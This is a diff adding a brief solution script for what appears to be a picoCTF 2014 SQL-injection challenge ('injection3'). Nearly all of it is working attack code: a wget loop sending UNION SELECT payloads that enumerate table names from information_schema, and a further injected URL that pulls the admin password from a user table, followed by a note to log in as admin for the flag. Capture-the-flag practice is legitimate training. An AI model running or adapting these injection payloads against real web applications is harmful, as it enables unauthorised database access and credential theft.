@@ -1,0 +1,7 @@
+# get database name
+for i in {0..44}; do wget -O -  "http://web2014.picoctf.com/injection3/lookup_user.php?debug=1&id=0 union select 1 as id, 1 as un, 1 as pw, (select TABLE_NAME from information_schema.tables order by TABLE_NAME desc limit $i,1) as dn, 1 as loc, 1 as mail, 1 as a" -q; echo; done
+
+# get admin password
+http://web2014.picoctf.com/injection3/lookup_user.php?debug=1&id=0 union select 1 as id, 1 as un,1 as pw, (select password from super_secret_users where id=1) as dn, 1 as loc, 1 as mail, 1 as a
+
+# login as admin:<password you got> to get flag from /index.php
